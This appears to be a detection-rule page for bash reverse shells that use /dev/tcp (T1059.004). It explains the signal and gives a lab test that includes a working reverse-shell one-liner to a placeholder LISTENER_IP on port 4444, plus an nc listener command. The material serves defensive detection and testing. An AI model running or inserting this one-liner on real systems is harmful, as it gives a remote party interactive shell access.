# Bash Reverse Shell via /dev/tcp (T1059.004)

## What it detects
A bash process whose command line contains `/dev/tcp/`. This is the
shortest portable reverse-shell one-liner on Linux.

## Why it matters
It requires no external tooling — just bash. Common in post-exploitation
where the attacker has a shell but no netcat. High signal, low noise
when baselined.

## Test it (lab only — this opens a real outbound connection)

On a lab host, to a listener YOU control:

```bash
# On the listener machine:
nc -lvnp 4444

# On the target lab host:
bash -c 'bash -i >& /dev/tcp/LISTENER_IP/4444 0>&1
